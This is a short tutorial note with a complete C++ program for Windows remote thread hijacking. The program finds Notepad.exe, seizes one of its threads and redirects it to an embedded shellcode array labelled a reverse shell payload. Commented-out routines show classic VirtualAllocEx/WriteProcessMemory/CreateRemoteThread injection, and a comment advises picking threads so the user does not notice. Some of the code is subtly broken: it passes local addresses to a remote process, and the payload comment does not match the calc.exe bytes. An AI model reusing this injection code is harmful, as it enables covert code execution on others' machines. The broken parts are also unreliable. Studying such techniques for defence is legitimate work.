# Remote Thread Hijack via Enumeration

Same principle as in remote thread hijack. What we can do is enumerate the threads of a target process, pick one and hijack it to execute our shellcode.

```cpp
#define _CRT_SECURE_NO_WARNINGS 1

#include <Windows.h>
//#include "resource.h"
#include <iostream>
#include <bcrypt.h>
#include <string>
#include <vector>;
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
//#define ERROR_INVALID_PARAMETER 87L;
#include <stdio.h>
#include <psapi.h>
#include <thread>
#include <chrono>
#include <functional>
#include <TlHelp32.h>

using namespace std;

BYTE Payload[] = { // Reverse shell payload
	0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 
	0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 
	0x31, 0xff, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 
	0xe2, 0xf2, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 
	0xe3, 0x48, 0x01, 0xd1, 0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 
	0x3a, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 
	0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58, 
	0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 
	0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 
	0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb, 0x8d, 0x5d, 0x6a, 0x01, 0x8d, 
	0x85, 0xb2, 0x00, 0x00, 0x00, 0x50, 0x68, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 
	0xf0, 0xb5, 0xa2, 0x56, 0x68, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x3c, 0x06, 0x7c, 
	0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x53, 
	0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};

BOOL PrintProcesses() {

	DWORD		adwProcesses[1024 * 2],
		dwReturnLen1 = NULL,
		dwReturnLen2 = NULL,
		dwNmbrOfPids = NULL;

	HANDLE		hProcess = NULL;
	HMODULE		hModule = NULL;

	WCHAR		szProc[MAX_PATH];

	// Get the array of PIDs
	if (!EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen1)) {
		printf("[!] EnumProcesses Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Calculating the number of elements in the array
	dwNmbrOfPids = dwReturnLen1 / sizeof(DWORD);

	printf("[i] Number Of Processes Detected : %d \n", dwNmbrOfPids);

	for (int i = 0; i < dwNmbrOfPids; i++) {

		// If process is not NULL
		if (adwProcesses[i] != NULL) {

			// Open a process handle
			if ((hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, adwProcesses[i])) != NULL) {

				// If handle is valid
				// Get a handle of a module in the process 'hProcess'
				// The module handle is needed for 'GetModuleBaseName'
				if (!EnumProcessModules(hProcess, &hModule, sizeof(HMODULE), &dwReturnLen2)) {
					printf("[!] EnumProcessModules Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
				}
				else {
					// If EnumProcessModules succeeded
					// Get the name of 'hProcess' and save it in the 'szProc' variable
					if (!GetModuleBaseName(hProcess, hModule, szProc, sizeof(szProc) / sizeof(WCHAR))) {
						printf("[!] GetModuleBaseName Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
					}
					else {
						// Printing the process name & its PID
						wprintf(L"[%0.3d] Process \"%s\" - Of Pid : %d \n", i, szProc, adwProcesses[i]);
					}
				}

				// Close process handle
				CloseHandle(hProcess);
			}
		}

		// Iterate through the PIDs array  
	}

	return TRUE;
}

BOOL GetRemoteProcessHandle(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess) {

	DWORD		adwProcesses[1024 * 2],
		dwReturnLen1 = NULL,
		dwReturnLen2 = NULL,
		dwNmbrOfPids = NULL;

	HANDLE		hProcess = NULL;
	HMODULE		hModule = NULL;

	WCHAR		szProc[MAX_PATH];

	// Get the array of PIDs
	if (!EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen1)) {
		printf("[!] EnumProcesses Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Calculating the number of elements in the array
	dwNmbrOfPids = dwReturnLen1 / sizeof(DWORD);

	printf("[i] Number Of Processes Detected : %d \n", dwNmbrOfPids);

	for (int i = 0; i < dwNmbrOfPids; i++) {

		// If process is not NULL
		if (adwProcesses[i] != NULL) {

			// Open a process handle
			if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, adwProcesses[i])) != NULL) {

				// If handle is valid
				// Get a handle of a module in the process 'hProcess'.
				// The module handle is needed for 'GetModuleBaseName'
				if (!EnumProcessModules(hProcess, &hModule, sizeof(HMODULE), &dwReturnLen2)) {
					printf("[!] EnumProcessModules Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
				}
				else {
					// If EnumProcessModules succeeded
					// Get the name of 'hProcess' and save it in the 'szProc' variable
					if (!GetModuleBaseName(hProcess, hModule, szProc, sizeof(szProc) / sizeof(WCHAR))) {
						printf("[!] GetModuleBaseName Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
					}
					else {
						// Perform the comparison logic
						if (wcscmp(szProcName, szProc) == 0) {
							wprintf(L"[+] FOUND \"%s\" - Of Pid : %d \n", szProc, adwProcesses[i]);
							// Return by reference
							*pdwPid = adwProcesses[i];
							*phProcess = hProcess;
							break;
						}
					}
				}

				CloseHandle(hProcess);
			}
		}
	}

	// Check if pdwPid or phProcess are NULL
	if (*pdwPid == NULL || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}

//BOOL GetRemoteThreadhandleViaEnumeration (IN DWORD dwProcessId, OUT DWORD* dwThreadId, OUT HANDLE* hThread) {
//
//	HANDLE         hSnapShot = NULL;
//	THREADENTRY32  Thr = {
//		.dwSize = sizeof(THREADENTRY32)
//	};
//
//	// Takes a snapshot of the currently running processes's threads 
//	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
//	if (hSnapShot == INVALID_HANDLE_VALUE) {
//		printf("\n\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
//		goto _EndOfFunction;
//	}
//
//	// Retrieves information about the first thread encountered in the snapshot.
//	if (!Thread32First(hSnapShot, &Thr)) {
//		printf("\n\t[!] Thread32First Failed With Error : %d \n", GetLastError());
//		goto _EndOfFunction;
//	}
//
//	do {
//		// If the thread's PID is equal to the PID of the target process then
//		// this thread is running under the target process
//		if (Thr.th32OwnerProcessID == dwProcessId) {
//
//			*dwThreadId = Thr.th32ThreadID;
//			*hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, Thr.th32ThreadID);
//
//			if (*hThread == NULL)
//				printf("\n\t[!] OpenThread Failed With Error : %d \n", GetLastError());
//
//			break;
//		}
//
//		// While there are threads remaining in the snapshot
//	} while (Thread32Next(hSnapShot, &Thr));
//
//
//_EndOfFunction:
//	if (hSnapShot != NULL)
//		CloseHandle(hSnapShot);
//	if (*dwThreadId == NULL || *hThread == NULL)
//		return FALSE;
//	return TRUE;
//}

BOOL GetRemoteThreadHandleViaThreadId (IN DWORD dwProcessId, IN DWORD &dwThreadId, OUT HANDLE &hThread) {
	HANDLE         hSnapShot = NULL;
	THREADENTRY32  Thr = {};
	Thr.dwSize = sizeof(THREADENTRY32);

	// Takes a snapshot of the currently running processes's threads 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("\n\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first thread encountered in the snapshot.
	if (!Thread32First(hSnapShot, &Thr)) {
		printf("\n\t[!] Thread32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {
		// If the thread's PID is equal to the PID of the target process then
		// this thread is running under the target process
		if (Thr.th32OwnerProcessID == dwProcessId) {
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, Thr.th32ThreadID);

			if (hThread == NULL)
				printf("\n\t[!] OpenThread Failed With Error : %d \n", GetLastError());
			break;
		}

		// While there are threads remaining in the snapshot
	} while (Thread32Next(hSnapShot, &Thr));


_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (hThread == NULL)
		return FALSE;
	return TRUE;
}

BOOL AddNewThreadToRemote(std::function<void()> func, HANDLE& hThread, DWORD &threadId, HANDLE &remoteHProcess) {
	if (!func) {
		std::cerr << "[!] Invalid function.\n";
		return FALSE;
	}

	// Convert std::function into a raw callable for CreateThread
	auto threadProc = [](LPVOID lpParam) -> DWORD {
		auto* pFunc = reinterpret_cast<std::function<void()>*>(lpParam);
		(*pFunc)();  // Run the function
		delete pFunc; // Clean up
		return 0;
		};

	// Allocate function object on heap so thread can access it
	auto* pFuncCopy = new std::function<void()>(func);

	hThread = CreateRemoteThread(
		remoteHProcess,
		nullptr,              // default security
		0,                    // default stack size
		threadProc,           // thread start routine
		pFuncCopy,            // parameter
		0,     // sleep for now
		&threadId             // thread ID
	);

	if (hThread == nullptr) {
		std::cerr << "[!] CreateThread failed with error: " << GetLastError() << '\n';
		delete pFuncCopy;
		return FALSE;
	}

	CloseHandle(hThread);
	std::cout << "[+] Thread created with ID: " << threadId << '\n';
	return TRUE;
}

//BOOL AddNewThreadToRemoteProcess(HANDLE hProcess, HANDLE& hThread) {
//	if (hProcess == nullptr || hProcess == INVALID_HANDLE_VALUE) {
//		std::cerr << "[!] Invalid process handle.\n";
//		return false;
//	}
//	if (pShellcode == nullptr || sSizeOfShellcode == 0) {
//		std::cerr << "[!] Invalid shellcode or size.\n";
//		return false;
//	}
//
//	LPVOID pShellcodeAddress = nullptr;
//	SIZE_T bytesWritten = 0;
//	DWORD dwOldProtection = 0;
//	HANDLE hThread = nullptr;
//
//	pShellcodeAddress = VirtualAllocEx(hProcess, nullptr, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
//	if (pShellcodeAddress == nullptr) {
//		std::cerr << "[!] VirtualAllocEx failed with error: " << GetLastError() << '\n';
//		return false;
//	}
//	std::cout << "[i] Allocated memory at: " << pShellcodeAddress << '\n';
//
//	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &bytesWritten) || bytesWritten != sSizeOfShellcode) {
//		std::cerr << "[!] WriteProcessMemory failed with error: " << GetLastError() << '\n';
//		VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE);
//		return false;
//	}
//	std::cout << "[i] Successfully written " << bytesWritten << " bytes\n";
//
//	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
//		std::cerr << "[!] VirtualProtectEx failed with error: " << GetLastError() << '\n';
//		VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE);
//		return false;
//	}
//
//	DWORD threadId = 0;
//
//	hThread = CreateRemoteThread(
//		hProcess,
//		nullptr,
//		0,
//		reinterpret_cast<LPTHREAD_START_ROUTINE>(pShellcodeAddress),
//		nullptr,
//		0,
//		&threadId
//	);
//
//	if (hThread == nullptr) {
//		std::cerr << "[!] CreateRemoteThread failed with error: " << GetLastError() << '\n';
//		DWORD dummy;
//		VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, dwOldProtection, &dummy);
//		VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE);
//		return false;
//	}
//
//	std::cout << "[+] Thread created with ID:" << threadId;
//
//	return true;
//}

//bool InjectShellcodeToRemoteProcess(HANDLE hProcess, const BYTE* pShellcode, SIZE_T sSizeOfShellcode) {
//    if (hProcess == nullptr || hProcess == INVALID_HANDLE_VALUE) {
//        std::cerr << "[!] Invalid process handle.\n";
//        return false;
//    }
//    if (pShellcode == nullptr || sSizeOfShellcode == 0) {
//        std::cerr << "[!] Invalid shellcode or size.\n";
//        return false;
//    }
//
//    LPVOID pShellcodeAddress = nullptr;
//    SIZE_T bytesWritten = 0;
//    DWORD dwOldProtection = 0;
//    HANDLE hThread = nullptr;
//
//    pShellcodeAddress = VirtualAllocEx(hProcess, nullptr, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
//    if (pShellcodeAddress == nullptr) {
//        std::cerr << "[!] VirtualAllocEx failed with error: " << GetLastError() << '\n';
//        return false;
//    }
//    std::cout << "[i] Allocated memory at: " << pShellcodeAddress << '\n';
//
//    if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &bytesWritten) || bytesWritten != sSizeOfShellcode) {
//        std::cerr << "[!] WriteProcessMemory failed with error: " << GetLastError() << '\n';
//        VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE);
//        return false;
//    }
//    std::cout << "[i] Successfully written " << bytesWritten << " bytes\n";
//
//    if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
//        std::cerr << "[!] VirtualProtectEx failed with error: " << GetLastError() << '\n';
//        VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE);
//        return false;
//    }
//
//	DWORD threadId = 0;
//
//    hThread = CreateRemoteThread(
//        hProcess,
//        nullptr,
//        0,
//        reinterpret_cast<LPTHREAD_START_ROUTINE>(pShellcodeAddress),
//        nullptr,
//        0,
//        &threadId
//    );
//
//    if (hThread == nullptr) {
//        std::cerr << "[!] CreateRemoteThread failed with error: " << GetLastError() << '\n';
//        DWORD dummy;
//        VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, dwOldProtection, &dummy);
//        VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE);
//        return false;
//    }
//
//	std::cout << "[+] Thread created with ID:" << threadId;
//
//    auto threadCloser = [](HANDLE h) { if (h) CloseHandle(h); };
//    std::unique_ptr<void, decltype(threadCloser)> threadGuard(hThread, threadCloser);
//
//    std::cout << "[i] Executing payload ...\n";
//
//    DWORD waitResult = WaitForSingleObject(hThread, INFINITE); // 10s
//    if (waitResult == WAIT_FAILED) {
//        std::cerr << "[!] WaitForSingleObject failed with error: " << GetLastError() << '\n';
//    }
//    else if (waitResult == WAIT_TIMEOUT) {
//        std::cout << "[i] Remote thread did not finish within timeout (10s). Continuing.\n";
//    }
//    else {
//        std::cout << "[+] Remote thread finished.\n";
//    }
//
//    DWORD dummy;
//    if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, dwOldProtection, &dummy)) {
//        std::cerr << "[!] VirtualProtectEx(restore) failed with error: " << GetLastError() << '\n';
//    }
//
//    if (!VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE)) {
//        std::cerr << "[!] VirtualFreeEx failed with error: " << GetLastError() << '\n';
//    }
//
//    return true;
//}

// hijack thread code
bool HijackThread(HANDLE hThread, PVOID pAddress) {
	if (hThread == nullptr || pAddress == nullptr) {
		cerr << "[!] Invalid parameter(s) passed to HijackThread.\n";
		return false;
	}

	// Zero the CONTEXT structure and request control registers only
	CONTEXT ThreadCtx;
	RtlSecureZeroMemory(&ThreadCtx, sizeof(ThreadCtx));
	ThreadCtx.ContextFlags = CONTEXT_CONTROL;

	// Get the thread context (thread should usually be suspended by caller)
	if (!GetThreadContext(hThread, &ThreadCtx)) {
		cerr << "\n\t[!] GetThreadContext Failed With Error : " << GetLastError() << "\n";
		return false;
	}

	// Update the instruction pointer depending on architecture
#ifdef _M_X64
	ThreadCtx.Rip = reinterpret_cast<ULONG_PTR>(pAddress);
#else
	ThreadCtx.Eip = static_cast<DWORD>(reinterpret_cast<ULONG_PTR>(pAddress));
#endif

	// Set the modified context back to the thread
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		cerr << "\n\t[!] SetThreadContext Failed With Error : " << GetLastError() << "\n";
		return false;
	}

	// Resume the thread so it executes our payload, then wait for it to finish
	DWORD resumeResult = ResumeThread(hThread);
	if (resumeResult == (DWORD)-1) {
		cerr << "\n\t[!] ResumeThread Failed With Error : " << GetLastError() << "\n";
		return false;
	}

	WaitForSingleObject(hThread, INFINITE);

	return true;
}

void WaitForever() {
	std::cout << "Hello from new thread!\n";
	for (int i = 0; i < 10; i++) {
		std::this_thread::sleep_for(std::chrono::seconds(2));
		std::cout << "2 seconds passed." << std::endl;
	}
	std:cout << "Done dawg!!!" << endl;
}

int main(int argc, char* argv[]) {
    // PrintProcesses();
    DWORD pdwPid, threadId;
    HANDLE phProcess, phThread, newPhThread;
    LPCWSTR pname = L"Notepad.exe";
    GetRemoteProcessHandle(pname, &pdwPid, &phProcess);
	// ideally threads of some non-significant nature would be identified used so user doesn't notice malicious behaviour
	AddNewThreadToRemote(WaitForever, phThread, threadId, phProcess);
	cout << "he!" << endl;
	GetRemoteThreadHandleViaThreadId(pdwPid, threadId, newPhThread);

	cout << "he!he!" << endl;
	HijackThread(newPhThread, &Payload);
	std::cout << "Enter sth to get out!" << endl;
    std::cin.get();

    return 0;
}


const unsigned char EncodedPayload[] = {0x00}; // 0x00007FF7681760A0
```